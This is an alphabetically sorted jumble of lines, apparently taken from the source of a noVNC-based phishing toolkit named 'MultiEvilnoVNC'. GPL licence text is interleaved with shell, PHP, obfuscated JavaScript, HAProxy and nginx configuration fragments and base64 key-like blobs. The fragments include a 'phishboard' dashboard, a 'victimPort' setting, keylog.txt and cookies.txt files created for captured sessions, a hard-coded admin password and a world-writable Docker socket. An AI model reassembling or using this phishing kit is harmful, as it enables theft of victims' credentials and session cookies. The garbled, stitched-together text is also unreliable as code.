roLnRGvTVW4ymF18D5PRKkSXmSR6nPuTtawThPcMrFDj/qjUkArmeQNG
run a copy of the Program.  Ancillary propagation of a covered work
s4gnKe86fMTHpO43PJfVDpyGhR4J8f7qIrnNaUECgYBqVmyW0UI2FXTyQGWtjWj4
same work.
screen -S controller -dm sh -c 'cd controller
screen -S haproxy -dm sh -c 'cd haproxy
screen {
scrollbar-color: 
scrollbar-width: auto
searchStrings.every(val => {
sendPaste()
sendRequest(ctrlUrl 
server dash controller:80
server is running
server {
server_name controller
setTimeout( function() {
setTimeout( function(){ 
setTimeout(function(){var _0x52906f=_0x2bb1d3
share and change all versions of a program--to make sure it remains free
shell=/bin/bash
show c' for details.
show c' should show the appropriate
show w' and 
show w'.
similar laws prohibiting or restricting circumvention of such
sjs34YWzxWYbyNV2OT/pojQ2GQ0LYFbhPcCcAwIcODAoIBAQDH2nmuNPSB
sleep .2
sleep 10
sleep 15
sleep 2
sleep 2 
sleep(5000).then(() => {window.location.reload()})
software and other kinds of works.
specifically granted under this License.  You may not convey a covered
ssl_certificate     cert.crt
ssl_certificate_key key.key
ssl_protocols       TLSv1.2
stand ready to extend this provision to those domains in future versions
start()
state the exclusion of warranty
stats socket ipv4@0.0.0.0:8000 level admin expose-fd listeners
stats td {
string $keyspace = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
sub {
sub4 {
sub4 { margin-left: 10px
submitlog.txt
subprograms and other parts of the work.
such as by intimate data communication or control flow between those
sudo -E /bin/bash -c /home/user/startVNC.sh $RESOLUTION
sudo chmod 666 /var/run/docker.sock
sudo chmod 777 kiosk.zip
sudo docker build -t joelgmsec/evilnovnc .
sudo docker network create evil
sudo docker run -d --rm --network evil 
sudo docker stop -t 0 evil$SID 
sudo mkdir -p /var/run/dbus 
sudo mkdir -p Downloads 
sudo mkdir Downloads 2> /dev/null 
sudo pkill -9 php
sudo rm -f ./tmp/resolution$SID.txt ./tmp/reqid$SID.txt ./tmp/useragent$SID.txt
sudo rm -f /tmp/.X${DISPLAY
sudo rm -rf ./tmp/reqid$SID.txt > /dev/null 2>
sudo rm -rf ./tmp/resolution$SID.txt > /dev/null 2>
sudo rm -rf ./tmp/useragent$SID.txt > /dev/null 2>
sudo service docker start > /dev/null 2>
suffice to ensure that the continued functioning of the modified object
sum { text-align: center
svXtOLHpfU8n2RVTUI5UHoS3brovptng1OyMHpJHKuNDxNWe/tYJEoVFmr0gTkab
svr=$sid
switch($command) {
switch((int)$state) {
t or $0 
t$agent
t$fields
t$ip
t$reqid
t$userid
t./start.sh 
t1280x720  16bits: 
t1280x720  24bits: 
t1920x1080 16bits: 
t1920x1080 24bits: 
t3QsEsRYvGlPsILfp3YA
t5dEFGNtu8
tUmQLTMBcEc6fBzQ0qvcgBQFro0UwCQ/M750Hnocod4i6gpeF/qroJAiWOn3Zw5z
tUrl=$1
tXlNBx0s5AbnP2plw9DlgDS
table
table .ids { width: 90px
table .ips { width: 120px
table .timestamps { width: 180px
table th {
table tr:hover td { color: 
table tr:hover th { color: 
table {
targetinput {
targetlink { font-weight: bold
targets.json
technological measures.
tells the user that there is no warranty for the work (except to the
text-align: center
text-align: left
text-align:center
text-decoration:none
text-transform: uppercase
text=MultiEvilnoVNC 
that material) supplement the terms of this License with terms:
that there is no warranty for this free software.  For both users' and
that they are valid under applicable law.  If additional permissions
the GNU General Public License from time to time.  Such new versions will
the GNU General Public License is intended to guarantee your freedom to
the User Product in which it has been modified or installed.  Access to a
the above requirements apply either way.
the conditions stated below.  Sublicensing is not allowed
the only significant mode of use of the product.
the predecessor has it or can get it with reasonable efforts.
the terms of this License in conveying all material for which you do
then
then you must either (1) cause the Corresponding Source to be so
this License (including any patent licenses granted under the third
this License without regard to the additional permissions.
this License.
this License.  If your rights have been terminated and not permanently
timeout client 20s
timeout connect 5s
timeout http-request 20s
timeout queue 5s
timeout server 10s
timeout tunnel 1800s 
tj4S7OMBgavOG8
to attach them to the start of each source file to most effectively
to choose that version for the Program.
to collect a royalty for further conveying from those to whom you convey
to the extent that it includes a convenient and prominently visible
to the third party based on the extent of your activity of conveying
to {
top: -20px
top: 0
top: 20px
touch /home/user/Downloads/cookies.txt
touch /home/user/Downloads/keylog.txt
touch accesslog.txt submitlog.txt targets.json haproxy/whitelist.acl haproxy/blacklist.acl
transaction who receives a copy of the work also receives whatever
transition: .1s
trap cleanup SIGTERM EXIT
try:
try_files $uri $uri/ /index.php
ts$svrno
u2bWr7OPbJ6u1WvYhk9SbTLRt562NrmmJrioqfcc0eh62bJ4PBCBbhUQxpyUtoXw
ujDDc81F
under version 3 of the GNU Affero General Public License into a single
unzip -n kiosk.zip
update_state($state)
url 
url='/index.php
usage () {
use_backend controller if { path_beg /input } { urlp(reqid) -m found }
use_backend controller if { path_beg /phishboard } is_admin
use_backend dashboard if { path_beg /phishboard } { urlp(accesstoken) k45 }
used to limit the access or legal rights of the compilation's users
user ekadmin insecure-password ---adminPass---
userlist mycreds
utm_source=challenge
vHpM4z6bCuNfT
vOSEDXcPl01fWIHnbe6OpwAwDQYJKoZIhvcNAQEN
vSBORptmK7O
var _0x31b270=_0x4b7f3e[_0x4e93cf]
var mainLoopId = setInterval(function(){
vcheWS6CTtVl9fWh
version or of any later version published by the Free Software
victimPort=443
visibility: hidden
vjQzRa/S11PxgI6nDXWnBSOABv5aTgBASgzxYQzbLGpQBu5egrlw3K7hsobmtSS5
vl=default
vqyn5br5pmVHZBYn/MnATWh8m
w1ZZ4gHKXEdXnSlG8iffTd62Qn/l9w2LAbPXI
w8Z9qqV5ifNyIwltQf5OI8zAFOJiIqYktJDjKm0SrlaNFKJOGYhWOcCe7hPFGsVm
wB5r/isl6Fk/he4ZRpAoIBAQDt9cK/1j
wPaB6Jv/Nxk3esqrx3Xm28RU/DBQPxzQoYTAFLquN7VxK628XnokADcYTJtMAfuw
where to find the applicable terms.
while ($line !== false) {
while [ ! -f /home/user/tmp/resolution$SID.txt ]
while [[ ! $(xdpyinfo -display $DISPLAY 2> /dev/null) ]]
while [[ ! -f ./tmp/resolution$SID.txt ]]
while true 
while(!![]){try{var _0x20c3e4=-parseInt(_0xefc6e2(0x8d))/0x1
while($line !== false) {
while(isset($entry[$cnt])) {
white-space: nowrap
width: 100%
width: 16px
width: 22%
width: 24%
width: 29%
width: 32px
width: 33%
width: 40%
width: 5%
width: 5px
width: 69%
width: 77%
width: 98%
width:1.875rem
width:100%
window.setInterval(function () {
work and works based on it.
work if you are a party to an arrangement with a third party that is
x $erun
x $hrun
x $run
x20ocurrido
x20un
x25CF
xIuM3yzepN72G8MHST7nqjyqBsfcjKqtUmuKu4u/KzPDSUuhXPlIWphiLdC85wSY
xJ65vRtbbrwDoEVVXwBIyG5i0yGyjhohdAQ==
xU4dhVJgWWJiVr577nz2YqBP
xZLezfvMjyKELj5T8KLFaDcLHagWqQA
xhr.send()
xxsMLj2toFNTJas2C0LPjH/5zU8KUcAZzS/HXKcSiO2VG1jDxn2qpXmJ83IjCW1B
yJQ6PuV2sj6W7yZWDRildvoUCbKPRqMzc4M5SKMRFtvB
yR5DGNkAjIxn4ipmTeGSYjm2EbhFYdK1lcBWRU7lGQg0pp9wgUuf/NZ1vSWFjVDs
yS8Cg8cOfMo25tlmUOoycbpUb
yY7GV5OFo5/I1K7XsZ1Gpg==
ylxHV50pRvIn303etkJ/5fcNiwGz1yPhl0sZSh/n
you grant is automatically extended to all recipients of the covered
you modify it: responsibilities to respect the freedom of others.
your copyrighted material outside their relationship with you.
your receipt of the notice.
ywLyNR3YsOsEufrrkw/WWN9rFfhTXAQbTs5qBsVhwlgDrU6tTnClBed8G4F/KmR5
z-index: 100
z-index: 200
z-index: 50
zAIw
zoCGm0v8yLjCH6x5TOw1X60Nqszl6/5nNIoYL7D4kAUd/ER
{box-sizing:border-box
} else {
} elseif($content = file_get_contents($path) === false) {
}).join('')).replace(/
}</script>
}catch(_0x524958){_0x71d5d2['push'](_0x71d5d2['shift']())
